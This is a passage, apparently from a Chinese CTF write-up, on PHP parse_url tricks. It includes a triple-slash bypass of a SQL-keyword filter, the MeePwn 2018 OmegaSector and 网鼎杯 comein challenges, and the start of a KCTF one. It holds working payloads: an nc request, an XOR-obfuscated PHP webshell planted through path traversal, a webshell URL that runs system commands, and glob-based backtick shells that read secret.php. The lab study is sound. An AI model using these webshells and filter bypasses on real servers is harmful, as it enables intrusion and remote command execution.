+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Stop hacking by using SQL injection!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">Add_S&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">$array&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">check_url&lt;/span>&lt;span style="color:#111">()&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_URI&amp;#39;&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">parse_str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;query&amp;#39;&lt;/span>&lt;span style="color:#111">],&lt;/span>&lt;span style="color:#111">$query&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$key_word&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;select&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;from&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;for&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;like&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$query&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">foreach&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key_word&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#111">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">preg_match&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$value&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">strtolower&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">)))&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Stop hacking by using SQL injection!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>http://localhost/web/trick1/parse.php?sql=select 被过滤&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>array (size=2)
+&amp;#39;path&amp;#39; =&amp;gt; string &amp;#39;/web/trick1/parse.php&amp;#39; (length=21)
+&amp;#39;query&amp;#39; =&amp;gt; string &amp;#39;sql=select&amp;#39; (length=10)
+array (size=1)
+&amp;#39;sql&amp;#39; =&amp;gt; string &amp;#39;select&amp;#39; (length=6)
+&lt;/code>&lt;/pre>&lt;ul>
+&lt;li>http://localhost///web/trick1/parse.php?sql=select 成功绕过&lt;/li>
+&lt;/ul>
+&lt;pre tabindex="0">&lt;code>boolean false
+array (size=0)
+empty
+&lt;/code>&lt;/pre>&lt;p>具体原理可以参考&lt;a href="https://skysec.top/2017/12/15/parse-url%E5%87%BD%E6%95%B0%E5%B0%8F%E8%AE%B0/">这篇文章&lt;/a>，简单说就是&lt;code>///&lt;/code>被认为是相对url了&lt;/p>
+&lt;h3 id="meepwn-2018omegasector">[MeePwn 2018]OmegaSector&lt;/h3>
+&lt;pre tabindex="0">&lt;code class="language-php+HTML" data-lang="php+HTML">&amp;lt;?php
+ob_start();
+session_start();
+?&amp;gt;
+&amp;lt;html&amp;gt;
+&amp;lt;style type=&amp;#34;text/css&amp;#34;&amp;gt;* {cursor: url(assets/maplcursor.cur), auto !important;}&amp;lt;/style&amp;gt;
+&amp;lt;head&amp;gt;
+&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;assets/omega_sector.css&amp;#34;&amp;gt;
+&amp;lt;link rel=&amp;#34;stylesheet&amp;#34; href=&amp;#34;assets/tsu_effect.css&amp;#34;&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;?php
+ini_set(&amp;#34;display_errors&amp;#34;, 0);
+include(&amp;#39;secret.php&amp;#39;);
+$remote=$_SERVER[&amp;#39;REQUEST_URI&amp;#39;];
+if(strpos(urldecode($remote),&amp;#39;..&amp;#39;))
+{
+mapl_die();
+}
+if(!parse_url($remote, PHP_URL_HOST))
+{
+$remote=&amp;#39;http://&amp;#39;.$_SERVER[&amp;#39;REMOTE_ADDR&amp;#39;].$_SERVER[&amp;#39;REQUEST_URI&amp;#39;];
+}
+$whoareyou=parse_url($remote, PHP_URL_HOST);
+if($whoareyou===&amp;#34;alien.somewhere.meepwn.team&amp;#34;)
+{
+if(!isset($_GET[&amp;#39;alien&amp;#39;]))
+{
+$wrong = &amp;lt;&amp;lt;&amp;lt;EOF
+&amp;lt;h2 id=&amp;#34;intro&amp;#34; class=&amp;#34;neon&amp;#34;&amp;gt;You will be driven to hidden-street place in omega sector which is only for alien! Please verify your credentials first to get into the taxi!&amp;lt;/h2&amp;gt;
+&amp;lt;h1 id=&amp;#34;main&amp;#34; class=&amp;#34;shadow&amp;#34;&amp;gt;Are You ALIEN??&amp;lt;/h1&amp;gt;
+&amp;lt;form id=&amp;#34;main&amp;#34;&amp;gt;
+&amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;button-success&amp;#34; name=&amp;#34;alien&amp;#34; value=&amp;#34;Yes&amp;#34;&amp;gt;Yes&amp;lt;/button&amp;gt;
+&amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;button-error&amp;#34; name=&amp;#34;alien&amp;#34; value=&amp;#34;No&amp;#34;&amp;gt;No&amp;lt;/button&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;img src=&amp;#34;assets/taxi.png&amp;#34; id=&amp;#34;taxi&amp;#34; width=&amp;#34;15%&amp;#34; height=&amp;#34;20%&amp;#34; /&amp;gt;
+EOF;
+echo $wrong;
+}
+if(isset($_GET[&amp;#39;alien&amp;#39;]) and !empty($_GET[&amp;#39;alien&amp;#39;]))
+{
+if($_GET[&amp;#39;alien&amp;#39;]===&amp;#39;@!#$@!@@&amp;#39;)
+{
+$_SESSION[&amp;#39;auth&amp;#39;]=hash(&amp;#39;sha256&amp;#39;, &amp;#39;alien&amp;#39;.$salt);
+exit(header( &amp;#34;Location: alien_sector.php&amp;#34; ));
+}
+else
+{
+mapl_die();
+}
+}
+}
+elseif($whoareyou===&amp;#34;human.ludibrium.meepwn.team&amp;#34;)
+{
+if(!isset($_GET[&amp;#39;human&amp;#39;]))
+{
+echo &amp;#34;&amp;#34;;
+$wrong = &amp;lt;&amp;lt;&amp;lt;EOF
+&amp;lt;h2 id=&amp;#34;intro&amp;#34; class=&amp;#34;neon&amp;#34;&amp;gt;hellu human, welcome to omega sector, please verify your credentials to get into the taxi!&amp;lt;/h2&amp;gt;
+&amp;lt;h1 id=&amp;#34;main&amp;#34; class=&amp;#34;shadow&amp;#34;&amp;gt;Are You Human?&amp;lt;/h1&amp;gt;
+&amp;lt;form id=&amp;#34;main&amp;#34;&amp;gt;
+&amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;button-success&amp;#34; name=&amp;#34;human&amp;#34; value=&amp;#34;Yes&amp;#34;&amp;gt;Yes&amp;lt;/button&amp;gt;
+&amp;lt;button type=&amp;#34;submit&amp;#34; class=&amp;#34;button-error&amp;#34; name=&amp;#34;human&amp;#34; value=&amp;#34;No&amp;#34;&amp;gt;No&amp;lt;/button&amp;gt;
+&amp;lt;/form&amp;gt;
+&amp;lt;img src=&amp;#34;assets/taxi.png&amp;#34; id=&amp;#34;taxi&amp;#34; width=&amp;#34;15%&amp;#34; height=&amp;#34;20%&amp;#34; /&amp;gt;
+EOF;
+echo $wrong;
+}
+if(isset($_GET[&amp;#39;human&amp;#39;]) and !empty($_GET[&amp;#39;human&amp;#39;]))
+{
+if($_GET[&amp;#39;human&amp;#39;]===&amp;#39;Yes&amp;#39;)
+{
+$_SESSION[&amp;#39;auth&amp;#39;]=hash(&amp;#39;sha256&amp;#39;, &amp;#39;human&amp;#39;.$salt);
+exit(header( &amp;#34;Location: omega_sector.php&amp;#34; ));
+}
+else
+{
+mapl_die();
+}
+}
+}
+else
+{
+echo &amp;#39;&amp;lt;h2 id=&amp;#34;intro&amp;#34; class=&amp;#34;neon&amp;#34;&amp;gt;Seems like you are not belongs to this place, please comeback to ludibrium!&amp;lt;/h2&amp;gt;&amp;#39;;
+echo &amp;#39;&amp;lt;img src=&amp;#34;assets/map.jpg&amp;#34; id=&amp;#34;taxi&amp;#34; width=&amp;#34;55%&amp;#34; height=&amp;#34;55%&amp;#34; /&amp;gt;&amp;#39;;
+if(isset($_GET[&amp;#39;is_debug&amp;#39;]) and !empty($_GET[&amp;#39;is_debug&amp;#39;]) and $_GET[&amp;#39;is_debug&amp;#39;]===&amp;#34;1&amp;#34;)
+{
+show_source(__FILE__);
+}
+}
+?&amp;gt;
+&amp;lt;body background=&amp;#34;assets/background.jpg&amp;#34; class=&amp;#34;cenback&amp;#34;&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;!-- is_debug=1 --&amp;gt;
+&amp;lt;!-- All images/medias credit goes to nexon, wizet --&amp;gt;
+&amp;lt;/html&amp;gt;
+&amp;lt;?php ob_end_flush(); ?&amp;gt;
+&lt;/code>&lt;/pre>&lt;p>一共需要绕过这些if&lt;/p>
+&lt;pre tabindex="0">&lt;code>if($whoareyou===&amp;#34;alien.somewhere.meepwn.team&amp;#34;)
+⋮
+if($_GET[&amp;#39;alien&amp;#39;]===&amp;#39;@!#$@!@@&amp;#39;)
+⋮
+$_SESSION[&amp;#39;auth&amp;#39;]=hash(&amp;#39;sha256&amp;#39;, &amp;#39;alien&amp;#39;.$salt);
+exit(header( &amp;#34;Location: alien_sector.php&amp;#34; ));
+&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">echo&lt;/span> -ne &lt;span style="color:#d88200">&amp;#39;GET ..@alien.somewhere.meepwn.team/..//index.php?alien=%40!%23%24%40!%40%40 HTTP/1.1\r\nHost: 138.68.228.12\r\nConnection: close\r\n\r\n&amp;#39;&lt;/span> &lt;span style="color:#111">|&lt;/span> nc 138.68.228.12 &lt;span style="color:#ae81ff">80&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>之后有了认证过的PHPSESSID可以post一些数据，我们可以控制&lt;code>type=/../super_secret_shell.php&lt;/code>让数据被存入一个php文件中，但是仅限40个字符&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?=&lt;/span>&lt;span style="color:#111">$_&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;$&amp;lt;&amp;gt;/&amp;#39;&lt;/span>&lt;span style="color:#f92672">^&lt;/span>&lt;span style="color:#d88200">&amp;#39;{{{{&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>&lt;span style="color:#111">${$_}&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">_&lt;/span>&lt;span style="color:#111">](&lt;/span>&lt;span style="color:#111">${$_}&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#75af00">__&lt;/span>&lt;span style="color:#111">]);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// $_= &amp;#39;$&amp;lt;&amp;gt;/&amp;#39; ^ &amp;#39;{{{{&amp;#39; ----&amp;gt; $_ = &amp;#39;_GET&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// ${_GET}[_](${_GET})[__];
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// final &amp;lt;?=$_GET[_]($_GET[__])
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用这样的webshell，访问&lt;/p>
+&lt;pre tabindex="0">&lt;code>http://138.68.228.12/alien_message/super_secret_shell.php?_=system&amp;amp;__=rgrep MeePwn /var/www/
+&lt;/code>&lt;/pre>&lt;p>————解法2&lt;/p>
+&lt;pre tabindex="0">&lt;code>GET http://human.ludibrium.meepwn.team?human=Yes HTTP/1.0
+Host: human.ludibrium.meepwn.team
+&lt;/code>&lt;/pre>&lt;p>This tricky payload takes an advantage of &lt;code>default&lt;/code> in &lt;code>virtual hosts&lt;/code> set to &lt;code>/var/www/html&lt;/code> so any non-existent domain will point there. Also, it uses the alternative way of making the request using &lt;code>GET FULL_URL&lt;/code> syntax.&lt;/p>
+&lt;pre tabindex="0">&lt;code>&amp;lt;?=`/???/??? ../??????.??? &amp;gt; ===`
+&lt;/code>&lt;/pre>&lt;p>Even more tricky here using only 33 characters&amp;hellip; It calls for shell via &lt;code>...&lt;/code> syntax and then uses &lt;code>shell wildcards&lt;/code> so &lt;code>/???/???&lt;/code> will match &lt;code>/bin/cat&lt;/code> and &lt;code>../??????.???&lt;/code> matches &lt;code>../secret.php&lt;/code>. Finally, it writes the result to &lt;code>===&lt;/code> file. Amazing.&lt;/p>
+&lt;p>————解法3&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?=&lt;/span>&lt;span style="color:#d88200">`{${~&amp;#34;����&amp;#34;}[_]}`&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// echo -ne &amp;#39;&amp;lt;?=`{${~&amp;#34;\xa0\xb8\xba\xab&amp;#34;}[_]}`;&amp;#39;
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>————解法4&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?=&lt;/span>&lt;span style="color:#d88200">`/???/??? ../*`&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="网鼎杯-2018comein">[网鼎杯 2018]comein&lt;/h3>
+&lt;p>上面OmegaSector的简略版&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75af00">ini_set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;display_errors&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_URI&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span> &lt;span style="color:#75715e">// 请求的uri
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uri&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">stripos&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uri&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;.&amp;#34;&lt;/span>&lt;span style="color:#111">)){&lt;/span> &lt;span style="color:#75715e">// uri中要么不出现“.” 要么以“.”开头
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">die&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Unkonw URI.&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uri&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">PHP_URL_HOST&lt;/span>&lt;span style="color:#111">)){&lt;/span> &lt;span style="color:#75715e">//尝试解析uri 取出host
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">$uri&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REMOTE_ADDR&amp;#39;&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">$_SERVER&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#d88200">&amp;#39;REQUEST_URI&amp;#39;&lt;/span>&lt;span style="color:#111">];&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uri&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">$host&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">parse_url&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$uri&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#75af00">PHP_URL_HOST&lt;/span>&lt;span style="color:#111">);&lt;/span> &lt;span style="color:#75715e">//解析拼接后的uri 取出host
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#75af00">var_dump&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$host&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$host&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#d88200">&amp;#34;c7f.zhuque.com&amp;#34;&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;flag sasa&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
+&lt;li>&lt;a href="http://127.0.0.1.@c7f.zhuque.com/..//index.php">http://127.0.0.1.@c7f.zhuque.com/..//index.php&lt;/a>&lt;/li>
+&lt;/ul>
+&lt;p>最前面有个点；parse_url和apache的解析不同&lt;/p>
+&lt;p>PHP解析时把127.0.0.1看作是user，后面的c7f.zhuque.com看作是host&lt;/p>
+&lt;p>而apache认为127.0.0.1是host，后面的.@c7f.zhuque.com/是一个路径 不存在，后面..//index.php退回根目录，再访问index.php&lt;/p>
+&lt;h3 id="kctf-2022飞蛾扑火">[KCTF 2022]飞蛾扑火&lt;/h3>
+&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#75af00">curl_request&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$data&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;get&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$header&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;content-type: application/json&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">$https&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$timeout&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$method&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">strtoupper&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$method&lt;/span>&lt;span style="color:#111">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$ch&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">curl_init&lt;/span>&lt;span style="color:#111">();&lt;/span>&lt;span style="color:#75715e">//初始化
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_URL&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">$url&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//访问的URL
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_RETURNTRANSFER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//只获取页面内容，但不输出
+&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$https&lt;/span>&lt;span style="color:#111">){&lt;/span>
+&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">curl_setopt&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$ch&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">CURLOPT_SSL_VERIFYPEER&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#111">);&lt;/span>&lt;span style="color:#75715e">//https请求 不验证证书
